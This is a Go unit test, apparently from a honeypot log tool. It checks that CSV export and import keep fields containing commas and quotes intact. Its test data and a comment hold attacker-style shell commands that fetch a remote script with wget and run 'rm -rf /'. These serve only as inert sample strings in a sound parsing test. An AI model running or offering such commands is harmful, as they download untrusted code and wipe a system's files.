package database

import (
	"strings"
	"testing"
)

// TestCSVExportImportRoundTrip guards the data-corruption bug where TimescaleDB
// ImportData used strings.Split (now splitCSVLine): a field containing a comma
// (e.g. an attacker command "wget a,b; rm -rf /") is quoted by csvEscape on
// export and must split back to the SAME fields on import. A naive comma split
// shifted every subsequent column and corrupted source_ip/etc. Exercises the
// csvEscape (export) <-> splitCSVLine (import) format both backends share.
func TestCSVExportImportRoundTrip(t *testing.T) {
	cases := [][]string{
		{"2026-01-01T00:00:00Z", "cowrie", "1.2.3.4", "wget http://x/a,b.sh; rm -rf /", "user,name", `pa"ss`},
		{"a", "b,c", "d e", `f"g"h`, "", "plain"},
		{"x", "y", "z", "no special", "still,comma", `"quoted"`},
	}
	for i, fields := range cases {
		// Export: quote each field, join with commas (what ExportData writes).
		escaped := make([]string, len(fields))
		for j, f := range fields {
			escaped[j] = csvEscape(f)
		}
		line := strings.Join(escaped, ",")

		// Import: split it back (what ImportData now does).
		got := splitCSVLine(line)
		if len(got) != len(fields) {
			t.Fatalf("case %d: got %d fields, want %d (line=%q)", i, len(got), len(fields), line)
		}
		for j := range fields {
			if got[j] != fields[j] {
				t.Errorf("case %d field %d: got %q, want %q (line=%q)", i, j, got[j], fields[j], line)
			}
		}
	}
}
